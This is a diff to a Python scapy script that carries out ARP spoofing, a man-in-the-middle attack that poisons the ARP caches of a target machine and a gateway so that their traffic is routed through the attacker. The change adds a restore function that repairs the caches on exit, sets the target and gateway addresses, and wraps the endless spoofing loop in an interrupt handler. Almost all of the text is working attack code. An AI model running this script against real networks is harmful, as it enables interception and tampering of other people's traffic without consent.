@@ -27,11 +27,25 @@ def spoof(target_ip,spoof_ip):
     scapy.send(packet,verbose=False)
 
 
+def restore(destination_ip,source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
 sent_packets_count = 2
-while(True):
-    spoof("192.168.1.4","192.168.1.1")
-    spoof("192.168.1.1","192.168.1.4")
-    print("\r[+] packet sent: " + str(sent_packets_count) ,end="")
-    sent_packets_count += 2
-    time.sleep(2)
+target_ip ="192.168.1.5"
+gateway_ip ="192.168.1.1"
+try:
+    while(True):
+        spoof(target_ip,gateway_ip)
+        spoof(gateway_ip,target_ip)
+        print("\r[+] packet sent: " + str(sent_packets_count) ,end="")
+        sent_packets_count += 2
+        time.sleep(2)
+except(KeyboardInterrupt):
+    print("\n[+] Resetting ARP wait ...\n")
+    restore(target_ip,gateway_ip)
+    restore(gateway_ip,target_ip)
 
